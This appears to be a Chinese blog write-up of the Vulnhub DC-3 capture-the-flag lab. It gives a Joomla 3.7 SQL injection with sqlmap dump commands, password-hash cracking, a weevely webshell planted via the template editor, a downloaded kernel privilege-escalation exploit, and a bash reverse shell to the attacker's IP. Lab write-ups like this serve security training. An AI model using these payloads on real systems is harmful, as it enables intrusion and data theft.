---

layout: mypost
title: Vulnhub靶机DC3渗透
categories: [靶机]
---

靶机下载地址：[DC3](https://www.vulnhub.com/entry/dc-32,312/)

Kali Linux 地址：192.168.43.110

![](https://z3.ax1x.com/2021/04/23/cXj2ff.png)

DC3 地址：192.168.43.46，只有一个 80 端口开放

![](https://z3.ax1x.com/2021/04/23/cXvNHs.png)

> This time, there is only one flag, one entry point and no clues.
>
> To get the flag, you'll obviously have to gain root privileges.
>
> How you get to be root is up to you - and, obviously, the system.
>
> Good luck - and I hope you enjoy this little challenge.  :-)

 wappalyzer 分析下

![](https://z3.ax1x.com/2021/04/23/cXv6u4.png)

Joomla CMS 和 Ubuntu 是突破口

dirb 扫目录找后台

![](https://z3.ax1x.com/2021/04/23/cXvIgO.png)

```url
http://192.168.43.46/administrator/
```

/README.txt 看版本信息

![](https://z3.ax1x.com/2021/04/23/cXxKr4.png)

或者用 joomla 有专门的扫描工具

```bash
joomscan --url http://192.168.43.46/
```

![](https://z3.ax1x.com/2021/04/23/cXziQO.png)

# Joomla CMS

找现成 exp

```bash
searchsploit joomla 3.7
```

![](https://z3.ax1x.com/2021/04/23/cjSp7j.png)

选择第二个 

```bash
cat /usr/share/exploitdb/exploits/php/webapps/42033.txt
```

![](https://z3.ax1x.com/2021/04/23/cjS7KU.png)

漏洞地址

```url
http://192.168.43.46/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
```

![](https://z3.ax1x.com/2021/04/23/cjSOa9.png)

这里用 sqlmap 去跑会出问题

之前切换成 zsh ，但是 zsh 在缺省情况下始终自己解释，而不会传递给 find 来解释

可以在～/.zshrc 中加入 setopt no_nomatch

```bash
vi ～/.zshrc
source ~/.zshrc	
```

这里直接切换回 bash 了

爆库

```bash
sqlmap -u "http://192.168.43.46/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

![](https://z3.ax1x.com/2021/04/23/cjpUMT.png)

爆表

```bash
sqlmap -u "http://192.168.43.46/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables  -p list[fullordering]
```

![](https://z3.ax1x.com/2021/04/23/cjp5od.png)

爆字段

```bash
sqlmap -u "http://192.168.43.46/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' --columns -p list[fullordering]
```

![](https://z3.ax1x.com/2021/04/23/cj9pYn.png)

爆值

```bash
sqlmap -u "http://192.168.43.46/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C 'username,password' --dump -p list[fullordering]
```

![](https://z3.ax1x.com/2021/04/23/cj9ilV.png)

得到加密的密码

```password
$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
```

用 john 爆出明文

```bash
vim hash
john hash
```

![](https://z3.ax1x.com/2021/04/23/cjP9MV.png)

密码 snoopy （也可以直接用joomblah脚本得到）

![](https://z3.ax1x.com/2021/04/23/cjPZGR.png)

去后台

![](https://z3.ax1x.com/2021/04/23/cjPKsK.png)

发现模板 Templates 里可以修改 php 代码

用 weevely 生成后门

```bash
weevely generate password webshell.php // password 可修改
cat webshell.php
```

![](https://z3.ax1x.com/2021/04/23/cjP3IH.png)

```bash
weevely http://192.168.43.46/templates/beez3/webshell.php password
```

![](https://z3.ax1x.com/2021/04/23/cjPtzt.png)

成功上线，发现是 Ubuntu 2016 也就是 16.04 版本

# Ubuntu

经过一番尝试发现下面这个漏洞可以利用

![](https://z3.ax1x.com/2021/04/23/cjP6Wn.png)

![](https://z3.ax1x.com/2021/04/23/cjiPSI.png)

![](https://z3.ax1x.com/2021/04/23/cjPWLT.png)

将 exp 下载到靶机上，编译执行

```bash
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

这里对两个模板都尝试过，一个最后一步没反应，另一个最后一步不成功

事后回想应该是 chomd 777 权限问题

转换思路，反弹 shell

Kali 没有装蚁剑或冰蝎所以用 bash 来反

在任意模板主页 index.php 里植入小🐎

```shell
system("bash -c 'bash -i >& /dev/tcp/192.168.43.110/8080 0>&1' ");
```

打开 Kali 8080端口监听

```bash
nc -lvp 8080
```

访问反弹页面

```url
http://192.168.43.46/templates/protostar/index.php
```

![](https://z3.ax1x.com/2021/04/23/cjigtH.png)

成功上线，相同操作再来一次

![](https://z3.ax1x.com/2021/04/23/cjiqhj.png)

提权成功

![](https://z3.ax1x.com/2021/04/23/cjivj0.png)

Pwned！

